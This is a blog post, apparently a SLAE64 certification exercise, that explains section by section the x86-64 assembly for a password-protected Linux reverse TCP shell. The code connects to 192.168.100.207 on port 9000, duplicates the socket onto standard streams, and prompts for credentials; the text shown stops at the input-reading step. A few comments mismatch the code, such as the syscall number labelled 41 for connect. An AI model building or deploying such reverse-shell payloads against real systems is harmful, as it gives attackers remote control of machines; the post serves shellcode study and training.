---
layout: post
title: Password-protected Reverse TCP Shell
date: 2021-01-14 13:44:00
categories: posts
comments: false
en: true
---
#### Introduction

These series of posts starting with the prefix "SLAE64 - Assignment" will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have 
a close look at Linux Reverse Shells with password protection. 

A Reverse shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Bind Shell, arranging a specific 
connection on a trivial address, instead of binding the compromise device into a certain port. Furthermore, after the connection is established, a shell is executed, granting 
interaction to the attacker.

The first assignment from the seven is divided in two sections:

+ A: Requires the creation of a Reverse Shell with password protection through the Assembly language, and converting such into shellcode. 
+ B: Requires the alteration of the provided Bind Shell during the course, in order that it no longer possesses any form of NULL bytes (00). 

As exercise A is already quite a complex and long exercise, the first assignment will be segmented in two different posts, thing which may repeat within the second assignment. 
During the length of this post, you will observe the solution for exercise A.

##### Theory

If you remember the [x86 version of this assignment](https://whitecr0wz.github.io/posts/SLAE-Reverse/), you'd remember that the required functions for a Bind Shell are the 
following:

+ Socket

+ Connect

+ Dup2

+ Execve

After the dup2 syscall has been satisfied and executed, the connection should already possess the ability to interact with the other gadget. Therefore, we could send a message 
and receive information from the other device. The process will be the following:

+ Socket

+ Connect

+ Dup2

+ Function that is only executed if the comparison ends up not matching. (write failure message)

+ Function that asks for the passcode (write). After the dup2 syscall is initialized, a JMP will be set so that the flow directly continues to this function.

+ Function that reads the input (read).

+ Function that compares the input with the intended passcode. If they do not match, jump to the failure function.

+ Execve

+ Execve

##### Time to stick our hands into the mud

Let's crack this shellcode down and explain it section by section, shall we?

First things first, we have to clean all registers, otherwise the shellcode would fail within a real program flow with distinct values.

```term
global _start

_start:

xoring:

       xor rax, rax           ; Zeroes out RAX.
       xor rbx, rbx           ; Zeroes out RBX.
       xor rdi, rdi           ; Zeroes out RDI.
       xor rsi, rsi           ; Zeroes out RSI.
       xor rdx, rdx           ; Zeroes out RDX.
       xor rbp, rbp           ; Zeroes out RBP.
```

Let's initialize the socket. The procedure should follow this path:

manpage arguments: ```int socket(int domain, int type, int protocol);```

+ RAX obtains the syscall value.
+ RDI is incremented until the value AF_INET is given.
+ RSI is incremented once, in order to obtain the value SOCK_STREAM.
+ RDX is pushed, as its value is required to be 0.
+ The syscall is executed.
+ The RAX value is copied into RBX for sockfd arguments later on.

```term

socket:

       push word 41           ; Pushes word 41 (socket) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.

       inc rdi                ; Increments RDI.
       inc rdi                ; Increments RDI. Gives the value of AF_INET.
       inc rsi                ; Increments RSI. Gives value of SOCK_STREAM.

       push rdx               ; As the protocol isn't important, the value of 0 in RDX is pushed.
       syscall                ; The syscall is executed.

       mov rbx, rax           ; The value of RAX is saved on RBX. Such value will later on be used for sockfd arguments.
```

##### Connect

manpage arguments: ```int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);```

+ RBP stores value "192.168.100.207" in reverse and hex as well.
+ RAX obtains the syscall value.
+ RDI satisfies the sockfd argument, by copying the value in RBX.
+ 0 is pushed through RDX.
+ The value in RBP is pushed.
+ "9000" is pushed within the hex format.
+ "AF_INET" is pushed within the hex format.
+ The value of RSP is copied into RSI.
+ DL is given a length of 50.
+ The syscall is executed.
+ RSI is zeroed out.
+ RSI is given a value of 3, as the following function is dup2

```term
connect:

       mov rbp, 0xcf64a8c0    ; Saves "192.168.100.207" in hex and reverse order, storing it in RBP

       push word 42           ; Pushes word 41 (connect) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.

       mov rdi, rbx           ; Copies the value from RBX to RDI, granting RDI the sockfd value from the socket syscall.

       push rdx               ; Pushes 0

       push rbp               ; Pushes the value of RBP into the Stack.
       push word 0x2823       ; Pushes the word 9000 into the stack.
       push word 0x02         ; Pushes AF_INET into the stack.

       mov rsi, rsp           ; Copies the value of RSP into RSI.

       mov dl, 50             ; This argument requires the length of the struct, anything above 16 should work.
       syscall                ; The syscall is executed.

       xor rsi, rsi           ; Zeroes out RSI

       inc rsi                ; Increments RSI.
       inc rsi                ; Increments RSI.
       inc rsi                ; Increments RSI. This will work as a counter, for the dup2 syscall, by incrementing RSI by three times NULLs are prvented.
```

##### Dup2

manpage arguments: ```int dup2(int oldfd, int newfd);```

+ RAX obtains the syscall value.
+ The value of RBX is copied into RDI, satisfying the oldfd argument.
+ RSI is decremented, satisfying the newfd argument.
+ The syscall is executed.
+ As long as the Zero flag hasn't been set, repeat the loop.
+ Jump to the function "question".

```term
dup2:

       push word 33           ; Pushes word 33 (dup2) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.

       mov rdi, rbx           ; Copies the value from RBP to RDX, granting RDI the sockfd value from the socket syscall.
       dec rsi                ; RSI is decremented.
       syscall                ; The syscall is executed.

       jnz dup2               ; Jump to dup2 if the Zero flag (ZF) hasn't been set.

       jmp question           ; Jump to the "question" function.
```

##### Halt

manpage arguments: ```ssize_t write(int fd, const void *buf, size_t count);```

+ It is required to call the write syscall. This will be arranged by incrementing the value of AL by 1.
+ RDI will be incremented as well, as this will give RDI the STDOUT value, printing to the screen.
+ RSI will hold temporarely and push the value to print to the screen. 
+ RSI will then copy the value from RSP.
+ DL will be given the length of the entire string.
+ This should write "Failure. " into the client's screen.

```term
halt:

       xor rax, rax           ; Zeroes out RAX.
       xor rdi, rdi           ; Zeroes out RDI.
       xor rsi, rsi           ; Zeroes out RSI.
       xor rdx, rdx           ; Zeroes out RDX.

       push rdi               ; Pushes the NULL DWORD (0x00000000) of RDI into the stack.
       pop rbp                ; Pops the NULL DWORD in RBP.
       push rbp               ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an 
                              ; additional character that isn't needed (I.E an - or <)

       inc al                 ; Increments AL, giving the value 1 for the syscall write.
       inc rdi                ; Increments RDI, giving the value of 1, arranging STDOUT, printing the message on the screen.

       add rsi, ' '           ; Blank space.
       push rsi               ; Pushes the value of RSI into the stack.

       mov rsi, 'Failure.'    ; Inserts value 'Failure.' into RSI
       push rsi               ; Pushes the value of RSI into the stack.

       mov rsi, rsp           ; Copies the value of RSP into RSI. The complete phrase should be "Failure. "

       mov dl, 9              ; Gives DL the length of the entire string, which should be around 9. If DL is given a bigger value than the real one (I.E 50), the password will 
                              ; be printed when this message pops up.
       syscall                ; The syscall is executed.
```

##### Question

manpage arguments: ```ssize_t write(int fd, const void *buf, size_t count);```

+ It is required to call the write syscall. This will be arranged by incrementing the value of AL by 1.
+ RDI will be incremented as well, as this will give RDI the STDOUT value, printing to the screen.
+ RSI will hold temporarely and push the value to print to the screen. 
+ RSI will then copy the value from RSP.
+ DL will be given the length of the entire string.
+ This should write "Credentials:" into the client's screen.

```term
question:

       xor rax, rax           ; Zeroes out RAX.
       xor rdi, rdi           ; Zeroes out RDI.
       xor rsi, rsi           ; Zeroes out RSI.
       xor rdx, rdx           ; Zeroes out RDX.

       push rdi               ; Pushes the NULL DWORD (0x00000000) of RDI into the stack.
       pop rbp                ; Pops the NULL DWORD in RBP.
       push rbp               ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an 
                              ; additional character that isn't needed (I.E an - or <)

       inc al                 ; Increments AL, giving the value 1 for the syscall write.
       inc rdi                ; Increments RDI, giving the value of 1, arranging STDOUT, printing the message on the screen.

       mov rsi, 'entials:'    ; Inserts value 'entials:' into RSI
       push rsi               ; Pushes the value of RSI into the stack.

       mov rsi, 'Cred'        ; Inserts value 'Cred' into RSI
       push rsi               ; Pushes the value of RSI into the stack.

       mov rsi, rsp           ; Copies the value of RSP into RSI. The complete phrase should be "Credentials:"

       mov dl, 16             ; Gives DL the length of the entire string, which should be around 16. If DL is given a bigger value than the real one (I.E 50), the string will be 
                              ; printed several times and lack certain characters.
       syscall                ; The syscall is executed.
```

##### Read

manpage arguments: ```ssize_t read(int fd, void *buf, size_t count);```

+ The value of RAX is set to 0, as it is the value for the read syscall.
+ The value of RDI is quite irrelevant, therefore, it is zeroed as well.
+ RSI is inserted the value of RSP.
+ DL is given the quantity of bytes to read. Nonetheless, as long as the quantity is as big as the input, anything goes!

```term
       xor rax, rax           ; Zeroes out RAX.
       xor rdi, rdi           ; Zeroes out RDI.
       xor rdx, rdx           ; Zeroes out RDX.

       push rdx               ; Pushes the NULL DWORD (0x00000000) of RDX into the stack.
       pop rbp                ; Pops the NULL DWORD in RBP.
       push rbp               ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an 
                              ; additional character that isn't needed (I.E an - or <).

       mov rsi, rsp           ; Copies the value of RSP into RSI.

       mov dl, 30             ; Gives DL the quantity of bytes to read, anything beyond intended should work as well.
       syscall                ; The syscall is executed.
```
